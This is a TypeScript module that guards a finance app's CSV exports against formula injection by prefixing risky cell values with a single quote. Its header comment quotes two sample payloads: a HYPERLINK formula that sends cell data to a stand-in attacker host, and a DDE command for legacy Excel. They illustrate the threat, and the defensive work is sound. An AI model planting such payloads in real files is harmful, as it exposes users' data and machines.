/**
 * CSV formula-injection defence (bug-hunt finding SEC1).
 *
 * Exports previously escaped quotes and nothing else. Spreadsheets strip CSV
 * quoting BEFORE evaluating cell contents, so a quoted field beginning with
 * `=`, `+`, `-`, `@`, a tab or a carriage return is still parsed as a formula
 * when the file is opened:
 *
 *   "=HYPERLINK(""https://evil.tld/x?d=""&A2,""Refund"")"   -> exfiltrates cells
 *   "=cmd|'/c calc'!A0"                                      -> DDE on legacy Excel
 *
 * What makes this more than theoretical here: transaction descriptions and
 * merchant names are authored by THIRD PARTIES — the bank or merchant that
 * produced the imported statement — not by the person who later exports the
 * file. The exporter is the victim, and imported descriptions also seed
 * household-shared merchant names.
 *
 * The standard mitigation is to prefix a single quote, which spreadsheets treat
 * as "this cell is text". The visible value is unchanged in the spreadsheet.
 */
const FORMULA_TRIGGERS = ['=', '+', '-', '@', '\t', '\r'];

/**
 * Neutralize a value destined for a CSV cell. Returns the raw text (NOT quoted)
 * — quoting remains the caller's job, whether that is manual or via Papa.unparse.
 */
export function csvSafeValue(value: unknown): string {
  if (value === null || value === undefined) return '';
  const text = String(value);
  if (text.length === 0) return text;
  return FORMULA_TRIGGERS.includes(text[0]) ? `'${text}` : text;
}

/**
 * Neutralize AND quote a value for hand-assembled CSV rows.
 */
export function csvSafeQuoted(value: unknown): string {
  return `"${csvSafeValue(value).replace(/"/g, '""')}"`;
}
